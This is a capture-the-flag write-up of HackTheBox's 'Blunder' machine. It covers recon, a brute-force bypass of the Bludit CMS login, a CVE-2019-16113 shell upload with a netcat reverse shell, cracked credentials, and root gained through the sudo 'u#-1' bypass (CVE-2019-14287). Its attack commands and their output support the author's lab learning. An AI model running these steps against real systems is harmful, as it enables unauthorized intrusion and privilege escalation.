---
title: Blunder
description: Blunder box from HackTheBox write up.
---

# Blunder

## Nmap

Like always time for a Nmap scan.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate=1000 10.10.10.191
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-22 16:57 CET
Nmap scan report for 10.10.10.191
Host is up (0.052s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http

Nmap done: 1 IP address (1 host up) scanned in 103.37 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nmap -p 80 -sC -sV 10.10.10.191
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-22 17:00 CET
Nmap scan report for 10.10.10.191
Host is up (0.049s latency).

PORT   STATE  SERVICE VERSION
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Blunder | A blunder of interesting facts
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Blunder

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
```

## Port 80

Let's see what a directory bruteforce can say about the page.

```bash
┌──(kali㉿kali)-[~]
└─$ feroxbuster -u http://10.10.10.191/ -w Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x php ,txt -B

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.191/
 🚀  Threads               │ 50
 📖  Wordlist              │ Wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, , txt]
 🏦  Collect Backups       │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        0l        0w        0c http://10.10.10.191/admin => http://10.10.10.191/admin/
200      GET      170l      918w     7562c http://10.10.10.191/
403      GET        9l       28w      277c http://10.10.10.191/.php
200      GET        1l        5w       30c http://10.10.10.191/install.php
200      GET      105l      303w     3281c http://10.10.10.191/about
401      GET        0l        0w        0c http://10.10.10.191/admin/ajax
200      GET      170l      918w     7562c http://10.10.10.191/0
200      GET        2l        4w       22c http://10.10.10.191/robots.txt
200      GET        4l       23w      118c http://10.10.10.191/todo.txt
403      GET        9l       28w      277c http://10.10.10.191/server-status
200      GET       21l      171w     1083c http://10.10.10.191/LICENSE
200      GET      110l      387w     3960c http://10.10.10.191/usb
[####################] - 29m   240069/240069  0s      found:12      errors:160
```

According with the files and the administration login, this is a Bludit CMS. That `todo.txt` thing looks interesting:

```
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```

Hmm, I will note the name `fergus` since it is maybe a valid user. The CMS version looks like it is 3.9.2 according with some of the CSS files, searching for vulnerabilities I found some canditates.

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit BLUDIT      
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass                        | php/webapps/48746.rb
Bludit - Directory Traversal Image File Upload (Metasploit)                        | php/remote/47699.rb
Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)                              | php/webapps/50529.txt
Bludit 3.9.12 - Directory Traversal                                                | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass                                              | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                       | php/webapps/49037.rb
Bludit 3.9.2 - Directory Traversal                                                 | multiple/webapps/48701.txt
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                  | php/webapps/46060.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The interesting one here is the bruteforce bypass, using Cewl I got a custom wordlist of the page and using `fergus` as the username I started the attack:

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Blunder]
└─$ python3 CVE-2019-17240.py -l http://10.10.10.191/admin/ -u users.txt -p passwords.txt 
[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX 
     
[◑] Brute Force: Testing -> fergus:CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
[ ] Brute Force: Testing -> fergus:the
...
[↓] Brute Force: Testing -> fergus:Contribution
[*] Brute Force: Testing -> fergus:Letters
[▝] Brute Force: Testing -> fergus:probably
[v] Brute Force: Testing -> fergus:best
[┌] Brute Force: Testing -> fergus:fictional
[\] Brute Force: Testing -> fergus:character
[o] Brute Force: Testing -> fergus:RolandDeschain

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain
```

Cool! Now we can abuse CVE-2019-16113 to get shell into the system.

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Blunder]
└─$ ./CVE-2019-16113.py 
[+] Loggin successful.
[+] Token CSRF: 99113db248585aa181ff61762743a627f9d1fa34
[+] Shell upload succesful.
[+] .htaccess upload succesful.
[+] Command Execution Successful.

┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8000                           
listening on [any] 8000 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.10.191] 43076
bash: cannot set terminal process group (1285): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
```

## In the box

### From `www-data` to `hugo`

The first part of the escalation was easy, in the file `/var/www/bludit-3.10.0a/bl-content/databases` I found a hash that can be cracked. I now have credentials for the user `hugo`:

```
hugo:Password120
```

### Pwned!

The user `hugo` can execute `/bin/bash` as any user but `root`.

```bash
hugo@blunder:~$ sudo -l
Password: 
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

At least that is the idea of the configuration. The `sudo` version installed is vulnerable to the CVE-2019-14287, allowing us to get `root` access:

```bash
hugo@blunder:~$ sudo -u#-1 /bin/bash
Password: 
root@blunder:/home/hugo#
```
